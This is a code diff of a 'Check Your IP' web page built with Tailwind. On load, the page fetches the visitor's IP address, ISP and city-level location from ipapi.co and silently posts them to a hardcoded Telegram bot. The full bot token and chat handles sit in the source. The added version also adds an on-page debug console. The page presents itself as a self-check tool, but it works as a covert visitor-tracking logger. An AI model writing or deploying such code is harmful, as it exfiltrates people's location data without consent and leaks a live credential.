@@ -3,94 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Check Your IP</title>
+    <title>IP Checker with Telegram Debug</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-100 flex items-center justify-center h-screen">
-    <div class="bg-white p-6 rounded-lg shadow-lg text-center w-full max-w-md">
-        <h1 class="text-2xl font-bold text-gray-800 mb-4">Your IP Information</h1>
-        <div id="ip-info" class="space-y-4 hidden">
-            <p class="text-lg"><strong>IP Address:</strong> <span id="ip" class="text-blue-600"></span></p>
-            <p class="text-lg"><strong>ISP:</strong> <span id="isp" class="text-blue-600"></span></p>
-            <p class="text-lg"><strong>Location:</strong> <span id="location" class="text-blue-600"></span></p>
+
+    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-2xl font-bold mb-4">Check Your IP</h1>
+        <div id="ip-info" class="mb-4"></div>
+        <div id="debug-console" class="bg-gray-900 text-white p-4 rounded-lg mt-4 overflow-y-auto h-64">
+            <h2 class="text-lg font-bold mb-2">Debug Console</h2>
+            <pre id="debug-log" class="text-sm"></pre>
         </div>
-        <p id="loading" class="text-lg text-gray-600 animate-pulse">Loading your IP information...</p>
-        <div id="error" class="text-red-600 mt-4 hidden"></div>
-        <div id="debug" class="bg-gray-100 p-4 mt-4 rounded-lg text-left text-sm text-gray-600"></div>
     </div>
 
     <script>
-        const ipApiURL = 'https://ipapi.co/json/';
-        const telegramApiURL = 'https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage';
-        const chatId = '@Upenwajssisheh';
-
-        const ipElement = document.getElementById('ip');
-        const ispElement = document.getElementById('isp');
-        const locationElement = document.getElementById('location');
-        const ipInfoElement = document.getElementById('ip-info');
-        const loadingElement = document.getElementById('loading');
-        const errorElement = document.getElementById('error');
-        const debugElement = document.getElementById('debug');
-
         function debugLog(message) {
-            const log = document.createElement('p');
-            log.textContent = message;
-            debugElement.appendChild(log);
+            const logElement = document.getElementById('debug-log');
+            logElement.textContent += message + "\n";
         }
 
-        fetch(ipApiURL)
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const isp = data.org;
-                const location = `${data.city}, ${data.region}, ${data.country_name}`;
+        async function getIPData() {
+            try {
+                debugLog("Fetching IP information...");
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                const { ip, org, city, region, country_name } = data;
+                const location = `${city}, ${region}, ${country_name}`;
+                const isp = org || "Unknown ISP";
 
-                ipElement.textContent = ip;
-                ispElement.textContent = isp;
-                locationElement.textContent = location;
+                document.getElementById('ip-info').innerHTML = `
+                    <p><strong>IP:</strong> ${ip}</p>
+                    <p><strong>ISP:</strong> ${isp}</p>
+                    <p><strong>Location:</strong> ${location}</p>
+                `;
 
-                ipInfoElement.classList.remove('hidden');
-                loadingElement.classList.add('hidden');
+                debugLog(`IP: ${ip}`);
+                debugLog(`ISP: ${isp}`);
+                debugLog(`Location: ${location}`);
 
-                const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}`;
+                sendToTelegram(ip, isp, location);
+            } catch (error) {
+                debugLog("Error fetching IP information: " + error.message);
+            }
+        }
 
+        async function sendToTelegram(ip, isp, location) {
+            const message = `IP: ${ip} ISP: ${isp} Location: ${location}`;
+            const telegramUrl = `https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage`;
+
+            const payload = {
+                chat_id: "@HansSlebewG",
+                text: message
+            };
+
+            try {
                 debugLog("Sending message to Telegram: " + message);
-
-                fetch(telegramApiURL, {
+                const response = await fetch(telegramUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                })
-                .then(response => {
-                    debugLog("Telegram API response status: " + response.status);
-                    return response.json();
-                })
-                .then(result => {
-                    if (result.ok) {
-                        debugLog('Message successfully sent to Telegram.');
-                    } else {
-                        debugLog('Telegram API error response: ' + JSON.stringify(result));
-                        errorElement.textContent = 'Failed to send message to Telegram.';
-                        errorElement.classList.remove('hidden');
-                    }
-                })
-                .catch(error => {
-                    debugLog('Error sending message to Telegram: ' + error);
-                    errorElement.textContent = 'Error sending message to Telegram.';
-                    errorElement.classList.remove('hidden');
+                    body: JSON.stringify(payload)
                 });
-            })
-            .catch(error => {
-                loadingElement.textContent = 'Failed to load IP information.';
-                errorElement.textContent = 'Error fetching IP info.';
-                errorElement.classList.remove('hidden');
-                debugLog('Error fetching IP info: ' + error);
-            });
+
+                const result = await response.json();
+
+                debugLog("Telegram API response status: " + response.status);
+                debugLog("Telegram API response: " + JSON.stringify(result));
+
+                if (!result.ok) {
+                    debugLog("Telegram API error: " + result.description);
+                } else {
+                    debugLog("Message sent successfully.");
+                }
+            } catch (error) {
+                debugLog("Error sending message to Telegram: " + error.message);
+            }
+        }
+
+        getIPData();
     </script>
 </body>
 </html>
